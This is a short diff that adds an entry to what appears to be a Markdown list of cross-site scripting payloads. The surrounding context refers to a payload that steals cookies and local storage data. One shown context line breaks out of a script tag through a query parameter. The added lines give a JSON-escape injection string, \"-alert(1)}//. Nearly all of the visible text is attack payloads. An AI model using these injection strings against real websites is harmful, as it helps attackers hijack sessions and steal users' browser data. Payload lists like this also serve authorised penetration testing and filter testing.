@@ -71,6 +71,9 @@ Here is An XSS payload that steals both Cookies and Local Storage Data:
 ────────────────────────────────────────────
 ?token["</script><script>alert(9)</script>"]=123
 ────────────────────────────────────────────
+json escape xss
+\"-alert(1)}//
+────────────────────────────────────────────
 ```
 ---
 ```js
